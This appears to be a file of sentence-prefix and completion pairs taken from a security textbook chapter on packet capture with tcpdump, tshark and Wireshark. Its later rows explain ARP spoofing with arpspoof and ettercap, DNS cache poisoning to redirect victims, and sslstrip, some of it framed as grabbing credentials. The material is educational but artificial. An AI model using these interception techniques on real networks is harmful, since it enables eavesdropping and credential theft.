each layer of the open systems interconnection ( osi ) model,each layer of the open systems interconnection ( osi ) model has a different name for the chunk of data associated with it
"at layer 2 , where we are grabbing the messages off the network , since","at layer 2 , where we are grabbing the messages off the network , since they include the layer 2 header with mac addresses , the pdu is called a frame"
"for our purposes , i ’ ll be talking about packet capturing","for our purposes , i ’ ll be talking about packet capturing unless there is something related to the mac address or the nic"
"once the operating system , really the networking stack in the operating system","once the operating system , really the networking stack in the operating system , has the frames , they can be intercepted by a piece of software"
"once the software has the message , packet capturing software will","once the software has the message , packet capturing software will parse the message , extracting information out of each pro-tocol header"
"a command-line program , like tcpdump , which we will be","a command-line program , like tcpdump , which we will be looking at , may display information out of the different headers"
"you could also be using a graphical user interface ( gui ) , which has","you could also be using a graphical user interface ( gui ) , which has more options for how to display the header data , as well as the payload data"
"they provide details specifi c to the protocol—instructions , as","they provide details specifi c to the protocol—instructions , as it were , to the protocol on how to behave"
this is one reason it ’ s easier to use a gui-based program,"this is one reason it ’ s easier to use a gui-based program to analyze packets , even if we are capturing them with another tool"
a program like wireshark helps to make packet analysis much easier than,a program like wireshark helps to make packet analysis much easier than if we were trying to review all the details on the command line
the pro-gram tcpdump was fi rst written in the,the pro-gram tcpdump was fi rst written in the late 1980s and was later ported to other unix imple-mentations
"you will find this tool available on most , if not all ,","you will find this tool available on most , if not all , linux distributions as well as the different berkeley software distribution ( bsd ) distributions"
"it is a command-line program that can be used to give you an idea of what is happening on the network ,","it is a command-line program that can be used to give you an idea of what is happening on the network , but it can also be used to capture traffic and store that traffic in a file that can be opened later on"
you can see the output shows mostly essential,you can see the output shows mostly essential header information about each packet that has been captured
"tcpdump with no parameters root @ quiche : ~ # tcpdump tcpdump : verbose output suppressed , use -v","tcpdump with no parameters root @ quiche : ~ # tcpdump tcpdump : verbose output suppressed , use -v or -vv for full protocol decodelistening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes18:48:25"
"44374 : 6986 nxdomain 0/1/0 ( 154 ) one of the issues with tcpdump , which you can see in","44374 : 6986 nxdomain 0/1/0 ( 154 ) one of the issues with tcpdump , which you can see in the preceding code , is that by default , it resolves all numeric addresses to ones that are more human-friendly"
you ’ ll see the dns request show before the packet because in order,"you ’ ll see the dns request show before the packet because in order to display the packet , the dns request has to be issued and come back"
"tcpdump with no name resolution root @ quiche : ~ # tcpdump -n tcpdump : verbose output suppressed , use -v","tcpdump with no name resolution root @ quiche : ~ # tcpdump -n tcpdump : verbose output suppressed , use -v or -vv for full protocol decode listening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes 20:42:16"
5353 : 0 * - [ 0q ] 1/0/1 (,5353 : 0 * - [ 0q ] 1/0/1 ( cache flush ) txt '' si=aab36e20-cdbd-4e60-beeb-1bc0a3ab8e2d '' ( 141 ) 20:42:16
5353 : 0 * - [ 0q ] 1/0/1 (,5353 : 0 * - [ 0q ] 1/0/1 ( cache flush ) txt '' si=aab36e20-cdbd-4e60-beeb-1bc0a3ab8e2d '' ( 141 ) 20:42:16
5353 : 0 * - [ 0q ] 1/0/1 ( cache flush ) txt '' rpba=ac,5353 : 0 * - [ 0q ] 1/0/1 ( cache flush ) txt '' rpba=ac : c5:14:0e : e0:35 '' `` rpad=c77102094021 '' `` rphi=f27b7868fd6f '' `` rphn=ce75eb6a989e '' `` rpvr=164
5353 : 0 * - [ 0q ] 1/0/1 ( cache flush ) txt '' rpba=ac,5353 : 0 * - [ 0q ] 1/0/1 ( cache flush ) txt '' rpba=ac : c5:14:0e : e0:35 '' `` rpad=c77102094021 '' `` rphi=f27b7868fd6f '' `` rphn=ce75eb6a989e '' `` rpvr=164
16 '' `` rpha=ae260764c13d '' ( 192 ) much of what we see,"16 '' `` rpha=ae260764c13d '' ( 192 ) much of what we see is fairly straightforward , though it may or may not be especially useful"
then we see the source address followed by >,"then we see the source address followed by > , showing the direction and then the destination address"
what we can also tell there is that the udp datagram is the simple service,"what we can also tell there is that the udp datagram is the simple service discovery pro-tocol ( ssdp ) , part of universal plug and play ( upnp )"
we can tell this even without the assistance of tcpdump by just looking up the destination,"we can tell this even without the assistance of tcpdump by just looking up the destination port number , if we don ’ t happen to know that 1900 is a upnp port"
"the source port for the datagram is just an ephemeral port , assigned","the source port for the datagram is just an ephemeral port , assigned by the operating system when the message is sent out on the network"
because we have to set a parameter in the hardware,"because we have to set a parameter in the hardware , we have to run tcpdump as an administrative user"
"on windows , it would be anyone in the administrators group or","on windows , it would be anyone in the administrators group or another group that had permissions to interface with the network hardware like that"
"in the following listing , you can see a tcpdump","in the following listing , you can see a tcpdump capture with -vv as a command-line parameter to get additional details"
"it was once the case that the snapshot length was very short , so to get","it was once the case that the snapshot length was very short , so to get complete pack-ets , you had to tell tcpdump not to limit the number of bytes captured"
tcpdump capturing with additional verbosity root @ quiche : ~ # tcpdump -vv -s 0,"tcpdump capturing with additional verbosity root @ quiche : ~ # tcpdump -vv -s 0 tcpdump : listening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes10:40:27"
"047708 ip ( tos 0x0 , ttl 1 , id 48781 , offset 0 ,","047708 ip ( tos 0x0 , ttl 1 , id 48781 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 228 ) samsung"
"048568 ip ( tos 0x0 , ttl 64 , id 64646 , offset 0 ,","048568 ip ( tos 0x0 , ttl 64 , id 64646 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 68 ) quiche"
"068536 ip ( tos 0x0 , ttl 64 , id 16931 , offset 0 ,","068536 ip ( tos 0x0 , ttl 64 , id 16931 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 102 ) testwifi"
"068803 ip ( tos 0x0 , ttl 64 , id 64650 , offset 0 ,","068803 ip ( tos 0x0 , ttl 64 , id 64650 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 72 ) quiche"
"070769 ip ( tos 0x0 , ttl 64 , id 16932 , offset 0 ,","070769 ip ( tos 0x0 , ttl 64 , id 16932 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 123 ) testwifi"
"070930 ip ( tos 0x0 , ttl 64 , id 64651 , offset 0 ,","070930 ip ( tos 0x0 , ttl 64 , id 64651 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 71 ) quiche"
"072770 ip ( tos 0x0 , ttl 64 , id 16933 , offset 0 ,","072770 ip ( tos 0x0 , ttl 64 , id 16933 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 123 ) testwifi"
"072857 ip ( tos 0x0 , ttl 64 , id 64652 , offset 0 ,","072857 ip ( tos 0x0 , ttl 64 , id 64652 , offset 0 , flags [ df ] , proto udp ( 17 ) , length 72 ) quiche"
"2c:08:8c:1c:3b : db , root-pathcost 0 with default tcpdump settings , you get the ip","2c:08:8c:1c:3b : db , root-pathcost 0 with default tcpdump settings , you get the ip header information where it ’ s relevant to the packet—meaning fields of substance are set"
"in the case of tcp segments , you would get details","in the case of tcp segments , you would get details like the sequence and acknowledgment numbers as well as the flags set"
this means if the ascii value is a printable character,"this means if the ascii value is a printable character , you will see that printable character on the right-hand side"
"even in cases where you see printable characters , the meaning of","even in cases where you see printable characters , the meaning of the byte to the protocol in use may not be that character"
"hexadecimal representation of packet root @ quiche : ~ # tcpdump -i eth0 -x tcpdump : verbose output suppressed ,","hexadecimal representation of packet root @ quiche : ~ # tcpdump -i eth0 -x tcpdump : verbose output suppressed , use -v or -vv for full protocol decodelistening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes10:49:35"
v { `` da 0x0020 : 7461 223a 7b22 7631 223a 7b22 7572 6922 ta '' : { `` v1 '' : { ``,v { `` da 0x0020 : 7461 223a 7b22 7631 223a 7b22 7572 6922 ta '' : { `` v1 '' : { `` uri '' 0x0030 : 3a22 6874 7470 3a2f 2f31 3932 2e31 3638 : '' url 0x0040 : 2e38 362e 3232 3a38 3030 312f 6d73 2f31
"0/ '' } , '' v2 '' : { `` uri 0x0060 : 223a 2268 7474 703a 2f2f","0/ '' } , '' v2 '' : { `` uri 0x0060 : 223a 2268 7474 703a 2f2f 3139 322e 3136 `` : '' url 0x0070 : 382e 3836 2e32 323a 3830 3031 2f61 7069 8"
"22:8001/api 0x0080 : 2f76 322f 227d 7d2c 2272 656d 6f74 6522 /v2/ '' } } ,","22:8001/api 0x0080 : 2f76 322f 227d 7d2c 2272 656d 6f74 6522 /v2/ '' } } , '' remote '' 0x0090 : 3a22 312e 3022 2c22 7369 6422 3a22 7575 : '' 1"
"0 '' , '' sid '' : '' uu 0x00a0 : 6964 3a32 6239 3562 6466 652d 6138 3033 id:2b95bdfe-a803 0x00b0 : 2d34 3234 662d 3931 3530 2d34 3532 3434 -424f-9150-45244 0x00c0 : 6338 3162 3862","0 '' , '' sid '' : '' uu 0x00a0 : 6964 3a32 6239 3562 6466 652d 6138 3033 id:2b95bdfe-a803 0x00b0 : 2d34 3234 662d 3931 3530 2d34 3532 3434 -424f-9150-45244 0x00c0 : 6338 3162 3862 3022 2c22 7474 6c22 3a38 c81b8b0 '' , '' ttl '' :8 0x00d0 : 3030 302c 2274 7970 6522 3a22 616c 6976 000 , '' type '' : '' aliv 0x00e0 : 6522 7d0a e '' }"
it does this in a packet capture ( pcap ),"it does this in a packet capture ( pcap ) file format , which includes metadata about the packet capture session"
what you will see here is something you didn ’ t see,"what you will see here is something you didn ’ t see before , because you were only seeing the top of the capture"
"pcap tcpdump : listening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes^c116 packets captured119 packets","pcap tcpdump : listening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes^c116 packets captured119 packets received by filter0 packets dropped by kernel once we have the file written , we have a couple of options"
this reads the file back in and we can provide,this reads the file back in and we can provide additional command-line parameters to tell tcpdump how to display the output
"the program wireshark , which we will look at later , includes the","the program wireshark , which we will look at later , includes the pro - gram tshark , which can also be used to capture packets"
it says this because there have been cases of packet capture programs being,it says this because there have been cases of packet capture programs being affected by vulnerabilities where crafted packets could cause arbitrary code to be run
what this means is an attacker could cause tshark,what this means is an attacker could cause tshark to be compromised to run code provided by the attacker
"in the end , there is only so much data that can be displayed , and","in the end , there is only so much data that can be displayed , and beyond that , there is data that someone capturing packets would really be looking to see"
capturing traffic with tshark root @ quiche : ~ # tshark,capturing traffic with tshark root @ quiche : ~ # tshark running as user `` root '' and group `` root ''
"26 tcp 182 [ tcp retransmission ] 22 → 64631 [ psh , ack ] seq=321 ack=1 win=315 len=116 tsval=4284989880 tsecr=1235189447 just because there are","26 tcp 182 [ tcp retransmission ] 22 → 64631 [ psh , ack ] seq=321 ack=1 win=315 len=116 tsval=4284989880 tsecr=1235189447 just because there are some defaults that you may want to see doesn ’ t mean that someone may not want to be more granular about what is displayed"
this is an area in which tshark just plain outshines tcpdump,this is an area in which tshark just plain outshines tcpdump and would be a principal reason for using tshark over tcpdump
"in the following code listing , you will see an example","in the following code listing , you will see an example of how you would select the individual fields you wanted to display"
"in this case , we are printing the frame number , the ip addresses","in this case , we are printing the frame number , the ip addresses , the ip type of service field , and the ip time to live field"
"no matter which platform you are installing wireshark on ,","no matter which platform you are installing wireshark on , you will get tshark and other command-line programs installed by default"
"unlike with tcpdump and tshark , we see the entire network stack in wireshark","unlike with tcpdump and tshark , we see the entire network stack in wireshark , which techni - cally makes what we have captured frames rather than packets"
"1 wireshark frames list the columns , which are configurable , are the frame number , relative time","1 wireshark frames list the columns , which are configurable , are the frame number , relative time from the start of the capture , addresses , protocol , frame length , and then an info column"
wireshark doesn ’ t just give you the list of,wireshark doesn ’ t just give you the list of frames so you can see who was communicat- ing with what
"every field is broken out in the decode , not only providing you","every field is broken out in the decode , not only providing you with the name of the field and the value but also the meaning"
"for example , if you were just to look at the byte that","for example , if you were just to look at the byte that contains the ip version and the header length , you would see 0x45"
"this is the byte value , but the byte contains two","this is the byte value , but the byte contains two separate pieces of data in the two nibbles ( 4-byte values )"
wireshark knows that you take the value 5 and multiply it by 4 because the,wireshark knows that you take the value 5 and multiply it by 4 because the value in that field actually means the number of 32-bit ( 4 bytes ) double words
"if you look at the frame list , you can see the different","if you look at the frame list , you can see the different frames that are used to set up the encryption for a tls session"
open the protocol in the decode pane in the middle of the,"open the protocol in the decode pane in the middle of the wireshark window and you can see the specifics , shown in figure 9"
what you can see is the version of tls that is,what you can see is the version of tls that is being used as well as the specific message that is being sent
you know this based on the header information because,you know this based on the header information because the entire mes-sage isn ’ t yet being encrypted
"session keys , such as the ones used in tls-encrypted","session keys , such as the ones used in tls-encrypted web messages , are derived at the time of the session"
"as a result , all you will see now is tls , which means","as a result , all you will see now is tls , which means it doesn ’ t make a lot of sense to keep referring to ssl"
"wireshark does have the ability to take rsa ( rivest , shamir , adleman , the","wireshark does have the ability to take rsa ( rivest , shamir , adleman , the names of the people who created the algorithm ) keys to decrypt messages that have been tls-encrypted"
"in some cases , you may see encryption that uses a pre-shared","in some cases , you may see encryption that uses a pre-shared key , which essentially means a pass-word both parties already know about"
"4 rsa keys preferences all of what you have seen so far can be used , regardless of whether you","4 rsa keys preferences all of what you have seen so far can be used , regardless of whether you are opening a fi le that has been saved and has been opened in wireshark or the capture was done live"
"from here , you could just click the shark fin in the toolbar","from here , you could just click the shark fin in the toolbar to start up a capture on the default , or primary , interface"
5 wireshark home screen if you want to be able to capture from a non-default interface,"5 wireshark home screen if you want to be able to capture from a non-default interface , you would just select one of the interfaces in the list on the home screen"
it probably isn ’ t worth capturing traffic from any,it probably isn ’ t worth capturing traffic from any interface that isn ’ t showing traffic coming across it
” there is an edit box there where you could,"” there is an edit box there where you could enter a filter , which would restrict what wireshark captures"
"6 shows the capture filter , but wireshark will","6 shows the capture filter , but wireshark will also provide help if you are building a display filter"
"when it comes to the display filter , you can","when it comes to the display filter , you can filter on any field of any proto - col wireshark understands"
it makes life a lot easier if you are looking,it makes life a lot easier if you are looking through hundreds of thousands of frames that have been captured
berkeley packet filter ( bpf ) the packet-capturing tools we have looked,berkeley packet filter ( bpf ) the packet-capturing tools we have looked at so far all can use berkeley packet filter ( bpf )
"when you append a filter to a tcpdump command line ,","when you append a filter to a tcpdump command line , tcpdump will capture and display only packets that pass through the filter"
"as an example , the tcpdump examples in the preceding paragraph were actually cap- tured on a linux system","as an example , the tcpdump examples in the preceding paragraph were actually cap- tured on a linux system ( where i had a simple prompt , to be completely honest ) that i was ssh ’ d into"
when you are connected to a system over ssh and you run,"when you are connected to a system over ssh and you run a packet capture , the vast majority of packets would be ssh packets"
"in order to capture something useful and not just all ssh packets ,","in order to capture something useful and not just all ssh packets , the actual command run to capture packets would be tcpdump not port 22"
here you can see the output of tcpdump without any,"here you can see the output of tcpdump without any filters , where tcpdump was run through an ssh session"
"you ’ ll see that ssh and dns requests are the messages that are sent ,","you ’ ll see that ssh and dns requests are the messages that are sent , because every packet captured has to have ip addresses resolved to a hostname before it is displayed"
"running tcpdump without filters root @ quiche : ~ # tcpdump tcpdump : verbose output suppressed , use -v","running tcpdump without filters root @ quiche : ~ # tcpdump tcpdump : verbose output suppressed , use -v or -vv for full protocol decodelistening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes18:32:07"
"] , seq 3616191731:3616191919 , ack 453098787 , win 315 , options [","] , seq 3616191731:3616191919 , ack 453098787 , win 315 , options [ nop , nop , ts val 16893480 ecr 1259709774 ] , length 188 18:32:07"
"for example , you can see in the following code listing how you would","for example , you can see in the following code listing how you would capture tcp packets that either came from or were going to the host 192"
"with complex filters and also for clarity , you","with complex filters and also for clarity , you can use parentheses to iso-late one of the parameters"
you ’ ll notice the backslashes that are used here to make sure the linux shell,"you ’ ll notice the backslashes that are used here to make sure the linux shell doesn ’ t try to interpret them , and they are passed as parentheses to tcpdump"
"1\ ) tcpdump : verbose output suppressed , use -v or -vv for full","1\ ) tcpdump : verbose output suppressed , use -v or -vv for full protocol decodelistening on eth0 , link-type en10mb ( ethernet ) , capture size 262144 bytes18:41:33"
"url flags [ s ] , seq 674275431 , win 29200 , options [ mss 1460 ,","url flags [ s ] , seq 674275431 , win 29200 , options [ mss 1460 , sackok , ts val 2412954967 ecr 0 , nop , wscale 7 ] , length 0 18:41:33"
"] , seq 239316039 , ack 674275432 , win 28960 , options [ mss 1460 ,","] , seq 239316039 , ack 674275432 , win 28960 , options [ mss 1460 , sackok , ts val 235265600 ecr 2412954967 , nop , wscale 7 ] , length 0 18:41:33"
"] , seq 1 , ack 1 , win 229 , options [","] , seq 1 , ack 1 , win 229 , options [ nop , nop , ts val 2412958792 ecr 235265600 ] , length 0 18:41:37"
"] , seq 1 , ack 2 , win 227 , options [","] , seq 1 , ack 2 , win 227 , options [ nop , nop , ts val 235265982 ecr 2412958792 ] , length 0 18:41:37"
"] , ack 2 , win 229 , options [ nop , nop , ts val 2412958793 ecr 235265982 ] , length","] , ack 2 , win 229 , options [ nop , nop , ts val 2412958793 ecr 235265982 ] , length 0 keep in mind that when you are using bpf on the command line with tcpdump , you are using a capture filter"
if you are expecting to perform analysis on the captured file later on,"if you are expecting to perform analysis on the captured file later on , you should make sure you won ’ t need those packets later"
"port mirroring/spanning back when everything used simple hubs , which were just electrical","port mirroring/spanning back when everything used simple hubs , which were just electrical repeaters with no intelli-gence , getting traffic from everywhere on the network was easy"
these are devices that improve the performance and security of a,these are devices that improve the performance and security of a network by doing filtering at layer 2 at the network device
"when a frame comes in with a destination mac address , the switch can look up","when a frame comes in with a destination mac address , the switch can look up the port where mac address is and send the frame out that port to the destination system"
this makes capturing packets more difficult if you are looking,this makes capturing packets more difficult if you are looking for traffic that isn ’ t passing your network interface
you may be able to mirror multiple ports to a single port,"you may be able to mirror multiple ports to a single port , which would let you monitor traffic to and from multiple systems"
"if you could only monitor a single port , you","if you could only monitor a single port , you could consider mirroring the port that led to a gateway/routing device"
"this means you are seeing traffic entering and exiting the network , which could potentially give","this means you are seeing traffic entering and exiting the network , which could potentially give you more access to sensitive information than if you were to just monitor a single endpoint"
"on cisco devices , the feature used for configuring port","on cisco devices , the feature used for configuring port mirroring is referred to as switched port analyzer ( span )"
if you have five 1g switch ports and you are mirroring them out to,"if you have five 1g switch ports and you are mirroring them out to a single 1g port , you have the possibility of oversubscribing the receiving port"
this means you could easily drop packets you were trying to capture and the packets would be basically,"this means you could easily drop packets you were trying to capture and the packets would be basically random , depending on when you have too much data coming in to be able to send out"
"packet analysis ultimately , packet analysis is probably a big","packet analysis ultimately , packet analysis is probably a big part of why you are capturing the packets to begin with"
"once you have the packets , you will want to take a closer look at them , includ-ing filtering","once you have the packets , you will want to take a closer look at them , includ-ing filtering , following communication streams , and maybe even looking at the statistics and other visualizations from the packet capture"
"as noted earlier , wireshark really understands pro-tocols , which means it can not only","as noted earlier , wireshark really understands pro-tocols , which means it can not only decode the protocol , it can also tell you places where there may be protocol violations"
there are a number of other places where wireshark,there are a number of other places where wireshark can make reading through a packet capture significantly easier
once you open the packet in the window below the,"once you open the packet in the window below the frame list , you can get the details about the error"
"anywhere you see square brackets [ ] in wireshark , you are looking at data","anywhere you see square brackets [ ] in wireshark , you are looking at data provided by wireshark that it has calculated or inferred from the messages it has received"
"when a tcp connection starts up , sequence numbers are generated , and","when a tcp connection starts up , sequence numbers are generated , and to prevent spoofing tcp con- nections , the initial sequence number should be random"
"if you were to try to do this addition yourself ,","if you were to try to do this addition yourself , you would be spending some time tracking sequence numbers and acknowledgment numbers"
8 relative sequence numbers packets ( or frames ) that belong,8 relative sequence numbers packets ( or frames ) that belong to a particular conversation can be spread through a packet capture
you may find it difficult to move from one packet in the conversation to,"you may find it difficult to move from one packet in the conversation to another , especially if there are a lot of frames that pass by in between"
this can be done from a context menu that comes up,this can be done from a context menu that comes up when you right-click on a frame that belongs to the conversation
"if you select follow tcp stream , for example , wireshark will create a","if you select follow tcp stream , for example , wireshark will create a display filter for you , only showing the frames that belong to that conversation"
"with an http conversation , for example , you will see","with an http conversation , for example , you will see the text of the http messages between the client and the server"
"the client messages are colored with a pink background and red text ,","the client messages are colored with a pink background and red text , while the server messages are in blue with a lilac or light purple background"
9 follow tcp stream dialog box wireshark also has,9 follow tcp stream dialog box wireshark also has substantial capabilities to present statistics from the packet capture
this shows every protocol identified in the capture in,this shows every protocol identified in the capture in a hierarchy based on how the protocols are related
10 protocol hierarchy statistics another entry in the,10 protocol hierarchy statistics another entry in the statistics menu to look at is the conversations view
every layer of the capture has different sets of conversations,"every layer of the capture has different sets of conversations , since layer 2 conversations are different than ip address con-versations"
any ip conversation that passes out of the local,any ip conversation that passes out of the local network has a layer 2 conversa-tion with the local gateway
this may be especially true if your local browser sets up multiple connections to a web server to,"this may be especially true if your local browser sets up multiple connections to a web server to issue requests for images , html pages , and other resources that go into the rendering of a page"
"additionally , when we looked at the protocol decode , you could see","additionally , when we looked at the protocol decode , you could see errors in cases where the information identified by wireshark is in square brack-ets"
you don ’ t have to skim all the way through,you don ’ t have to skim all the way through the packet capture file to find the errors one at a time
"instead , if you go to the analyze menu , you can select expert information","instead , if you go to the analyze menu , you can select expert information and this will show you all of the frames that wireshark has identified as problematic"
"packets don ’ t contain time stamps , so just looking at most frames","packets don ’ t contain time stamps , so just looking at most frames or packets won ’ t give you the time the frame passed through the network"
this assumes the time and the time zone in the capturing file were,"this assumes the time and the time zone in the capturing file were correct , since it does rely on the configuration of the capturing system"
spoofing attacks you may not have to be stuck with only capturing packets that are,spoofing attacks you may not have to be stuck with only capturing packets that are destined to your system or ones that you can get to you by reconfiguring the switch
"if you are running spoofing attacks , it means at least one","if you are running spoofing attacks , it means at least one end of the conversation is potentially not getting to the appropriate end-point"
"if someone gets suspicious that something is wrong , they may","if someone gets suspicious that something is wrong , they may start looking for causes , which may mean you could be identified"
"the first is the request , where a system knows an","the first is the request , where a system knows an ip address but doesn ’ t know the corresponding mac address"
it sends an arp request out asking for the system,it sends an arp request out asking for the system with the ip address to respond with its mac address
"in theory , anyone could respond to that request with their mac address to get","in theory , anyone could respond to that request with their mac address to get the requesting system to send the message to the attacker ’ s/spoofer ’ s address"
we could make it even easier by simply not waiting,we could make it even easier by simply not waiting for the request to begin with and just sending the reply
"in order to be efficient , systems will take any arp responses","in order to be efficient , systems will take any arp responses , even if they didn ’ t ask , and cache the mapping"
"we could just send out arp responses , mapping whatever","we could just send out arp responses , mapping whatever ip address on the network we want to our mac address"
this would get all systems on the local network sending messages,"this would get all systems on the local network sending messages to us , as our address is in their arp cache"
the process of just sending out arp responses without a corresponding arp request is called,"the process of just sending out arp responses without a corresponding arp request is called gratuitous arp , meaning it ’ s an arp message that wasn ’ t asked for"
you can check it from an entry in the /proc pseudo,"you can check it from an entry in the /proc pseudo filesystem , as you can see in the following code listing"
"starting with windows vista , microsoft has a base time of","starting with windows vista , microsoft has a base time of 30,000 milliseconds , which is multiplied by a random value between"
arp cache duration on linux cat /proc/sys/net/ipv4/neigh/default/gc_stale_time 60 because the cache can time,"arp cache duration on linux cat /proc/sys/net/ipv4/neigh/default/gc_stale_time 60 because the cache can time out quickly , we have to keep sending out our gratuitous arp responses"
"when we redirect messages to our system , we really need to forward them","when we redirect messages to our system , we really need to forward them back out onto the network with the correct mac address in the destination field"
a tcp connection never completes because the syn,a tcp connection never completes because the syn or the syn/ack never reaches the appropriate destination system
this requires turning on forwarding so the message we are hijacking can,this requires turning on forwarding so the message we are hijacking can be forwarded back out the same interface to get to its intended destination
"it was written by dug song , who also wrote a","it was written by dug song , who also wrote a program called fragroute , which is useful in its own way"
"in the following code listing , you can see a run of arpspoof where i","in the following code listing , you can see a run of arpspoof where i ’ ve selected the default gateway on my net-work to be the one i spoof"
"this means i get messages that are destined for the default gate-way ,","this means i get messages that are destined for the default gate-way , so anything that ’ s going off-net gets sent to the system running arpspoof"
"instead of selecting a pair of hosts to sit between , i ’ ve","instead of selecting a pair of hosts to sit between , i ’ ve essentially said i want to sit between the entire network and the default gateway"
the problem with this approach is that only one side of the conversation will,the problem with this approach is that only one side of the conversation will arrive at this system—the side that is des - tined for the default gateway
this could be fixed by adding -t with a target ip address,this could be fixed by adding -t with a target ip address and then -r to indicate that reverse connections should be collected as well
"then , both of the systems specified would be spoofed","then , both of the systems specified would be spoofed to go to the system where arp - spoof is running"
"when you run an arp spoof attack , you need to know ip address to mac","when you run an arp spoof attack , you need to know ip address to mac address mappings , and you need to get ettercap to check for hosts on the network"
the first thing to do is to tell ettercap you are going to do a unified sniff if there,"the first thing to do is to tell ettercap you are going to do a unified sniff if there is only one interface on the system ettercap is running on , or bridged sniff if there are multiple interfaces"
let ’ s say you wanted to lis-ten to a conversation between two hosts on your network,"let ’ s say you wanted to lis-ten to a conversation between two hosts on your network , like a client system and a local domain controller , so as to potentially grab credentials"
"once the targets are selected , you can select arp","once the targets are selected , you can select arp spoof from the mitm menu , which is not shown here"
that selection will bring up a dialog box asking if we want,that selection will bring up a dialog box asking if we want to sniff remote connections and also if we want to spoof one way
"by default , with one target in target 1 and nothing else","by default , with one target in target 1 and nothing else explicitly selected , every other system on the network is in target 2"
"your tool may seed the network with the correct mappings ,","your tool may seed the network with the correct mappings , though in time the bad arp cache entries will just time out"
"with dns spoofing , we aren ’ t looking to capture","with dns spoofing , we aren ’ t looking to capture traffic neces-sarily , in the sense of grabbing an existing conversation"
when one of our targets tries to visit a website that we are interested in getting information,"when one of our targets tries to visit a website that we are interested in getting information from , we redirect them to an ip address where we have our own website set up"
"unless we can capture the traffic somewhere , it ’ s hard to make sure we","unless we can capture the traffic somewhere , it ’ s hard to make sure we are getting the dns request so we can know how and when to respond to it"
"dns requests are time-consuming , so operat-ing systems don","dns requests are time-consuming , so operat-ing systems don ’ t want to make them unless they are necessary"
that means we poison the cache once and have the system,that means we poison the cache once and have the system continue to send requests to the wrong address for poten-tially days
"it will look just like a dns zone file , where you provide","it will look just like a dns zone file , where you provide the record name , the record type , and what it maps to"
"at that single ip address , since these are website host - names ,","at that single ip address , since these are website host - names , there should be a web server that is capable of serving requests for those hostnames"
we also need to use an arp spoof attack to get traffi c,we also need to use an arp spoof attack to get traffi c on the network to our sys-tem so we can see the dns requests
once you get to the stage of starting an arp spoof,"once you get to the stage of starting an arp spoof , you can go to the plugins menu and select manage plugins"
"in case it ’ s not apparent , these attacks will only","in case it ’ s not apparent , these attacks will only work on the local network because the addressing is by mac address"
"in the following listing , you will see the log that","in the following listing , you will see the log that is written out in ettercap from any request that has been captured"
"while the entries in the preceding code listing were added ,","while the entries in the preceding code listing were added , none of the default entries in the fi le were removed"
"in that case , it ’ s not being redirected to one","in that case , it ’ s not being redirected to one of our local sys-tems but instead to another system on the internet altogether"
dns will respond with an ip address and the requesting,dns will respond with an ip address and the requesting system will attempt to make a connection to that ip address
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 48 byte packet ( 0800:11 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 52 byte packet ( 0800:06 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 52 byte packet ( 0800:06 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 48 byte packet ( 0800:11 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 48 byte packet ( 0800:11 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 48 byte packet ( 0800:11 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 52 byte packet ( 0800:06 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) send l3 error : 245 byte packet ( 0800:06 ) destined to 192
26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes,26 was not forwarded ( libnet_write_raw_ipv4 ( ) : -1 bytes written ( network is unreachable ) ) dhcp : [ 192
"56 ] the reason this works , even though the dns request does go out to the legitimate dns","56 ] the reason this works , even though the dns request does go out to the legitimate dns server and it responds , is because dns is udp , so there is no connection to be made"
"a system may send out multiple requests , since they are udp","a system may send out multiple requests , since they are udp and there is no guarantee the request will get to the dns server"
since the ettercap system is on the local network and there is a good chance the dns,"since the ettercap system is on the local network and there is a good chance the dns server is not , the dns response from the ettercap system should be the first one back"
even when tls was brought in to replace ssl because of ssl ’ s vulnerabili - ties,"even when tls was brought in to replace ssl because of ssl ’ s vulnerabili - ties , the early versions of tls had vulnerabilities that made it susceptible to having the encryption cracked"
this program was developed by moxie marlinspike in conjunction with,this program was developed by moxie marlinspike in conjunction with a presen - tation he made at black hat in 2009
"today , there is less of a likelihood of success because , ideally , system administrators","today , there is less of a likelihood of success because , ideally , system administrators on top of their game have removed older encryp - tion mechanisms like ssl and tls 1"
"2 and above , ssl strip won ’ t work","2 and above , ssl strip won ’ t work because the vulnerabilities that allowed it to work have been resolved"
it also uses other techniques to make it appear that the,"it also uses other techniques to make it appear that the connection is encrypted when , in fact , it isn ’ t"
